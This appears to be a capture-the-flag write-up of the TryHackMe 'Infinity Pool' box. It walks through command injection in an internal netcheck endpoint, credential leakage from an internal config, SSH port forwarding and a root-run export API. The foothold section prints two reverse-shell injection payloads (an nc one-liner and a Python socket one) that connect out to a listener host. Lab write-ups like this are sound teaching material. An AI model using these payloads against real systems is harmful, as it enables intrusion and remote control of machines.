---
title: "Infinity Pool — Day #11"
category: "Web / Boot2Root"
difficulty: "Medium"
date: "2026-08-06"
event: "TryHackMe Hacker Holidays"
tags:
  [
    "command-injection",
    "port-forwarding",
    "freepbx-ucp",
    "api-exploitation",
    "privilege-escalation",
  ]
---

## Recon (Nmap)

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```

## Initial foothold

`app.js` on the site contained a developer TODO comment pointing at an internal tool:

```js
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed™");
```

`/status` forwarded requests to `/internal/netcheck` to run a command — and that endpoint was disallowed in `robots.txt`, which is exactly where it was found.

Abusing the netcheck handler gave command execution:

```bash
127.0.0.1; nc -e /bin/sh 10.112.168.102 4444
# or
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.112.168.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

This landed a shell as the `web` user.

## Privilege escalation

Converted the shell to SSH using a key for cleaner follow-up access.

### What is Watchtower?

Watchtower is normally an open-source utility that monitors container health and restarts unhealthy containers. On this box it had been repurposed into something far more automated: a persistent, self-executing process carrying out actions with no human involvement.

### Mapping the running processes

```
web@tryhackme-2404:/var/www/infinity_pool$ ps auxw | grep 'automation'
root  665  ... gunicorn --workers 1 --bind 127.0.0.1:9000 wsgi:app
root  932  ... gunicorn --workers 1 --bind 127.0.0.1:9000 wsgi:app
```

```
web@tryhackme-2404:/var/www/infinity_pool$ ps auxw | grep 'watchtower'
svc-watch  667  ... gunicorn --workers 1 --bind 127.0.0.1:3000 wsgi:app
svc-watch  928  ... gunicorn --workers 1 --bind 127.0.0.1:3000 wsgi:app
```

Two separate internal web services: an "automation" app on `127.0.0.1:9000` running as **root**, and a "watchtower" app on `127.0.0.1:3000` running as `svc-watch`.

### The systemd units behind them

`/etc/systemd/system/` is where local unit files live — they tell systemd how to start, stop, and run each service, and as which user.

`cc-automation.service`:

```ini
[Unit]
Description=Closed Circuit - Automation job runner (loopback, root)
After=network.target redis-server.service

[Service]
User=root
Group=root
WorkingDirectory=/var/www/infinity_pool/automation
EnvironmentFile=/var/www/infinity_pool/automation/automation.env
ExecStart=/var/www/infinity_pool/automation/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:9000 wsgi:app
Restart=on-failure
RestartSec=2

[Install]
WantedBy=multi-user.target
```

`cc-watchtower.service`:

```ini
[Unit]
Description=Closed Circuit - Watchtower ops console (loopback)
After=network.target

[Service]
User=svc-watch
Group=svc-watch
WorkingDirectory=/var/www/infinity_pool/watchtower
ExecStart=/var/www/infinity_pool/watchtower/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:3000 wsgi:app
Restart=on-failure
RestartSec=2

[Install]
WantedBy=multi-user.target
```

Confirmation: `cc-automation.service` runs **as root**, and it's only reachable from inside the box (`127.0.0.1:9000`).

### Enumerating the internal APIs

```bash
curl -sS 127.0.0.1:9000/health
```

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": { "report": "<report name>" },
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

This confirms: the automation service exposes `POST /jobs/export`, requires a bearer token, accepts a `report` name in the body, and — critically — `"runs_as": "root"`.

```bash
curl -sS 127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

Watchtower's own config leaked credentials for a FreePBX **UCP** (User Control Panel) — the web interface for managing the Asterisk PBX — still on default template credentials, with an explicit "ROTATE" note the attacker clearly ignored.

### Reaching the telephony portal

`127.0.0.1:8080/ucp` redirected to a login page. Port-forwarding it out over SSH made it reachable from the attacking machine:

```bash
ssh -o IdentitiesOnly=yes -i ctf_key \
  -L 8080:127.0.0.1:8080 \
  web@10.129.152.181
```

Logging in with the leaked `FreePBXUCPTemplateCreator` / `St4yN0t1c3d_2026` credentials surfaced the automation bearer key needed for `/jobs/export`.

### Abusing the root-run automation endpoint

```bash
curl -sS \
    -X POST \
    http://127.0.0.1:9000/jobs/export \
    -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
    -H 'Content-Type: application/json' \
    --data-binary '{"report":"latest"}'
```

```json
{
  "command": "tar czf /var/automation/exports/latest.tgz /var/automation/data 2>&1",
  "output": "tar: Removing leading `/' from member names\n"
}
```

The response showed the exact shell command being built server-side from the `report` value — and since that service runs as root, this is command injection with root privileges: controlling the `report` field controls what gets executed as root.

## Takeaway

Internal-only APIs (loopback-bound ports) are a common place for developers to skip input validation, on the assumption that "nothing external can reach it." A single public-facing bug (the netcheck RCE) was enough to pivot inward and reach a root-run service that built shell commands from user input.
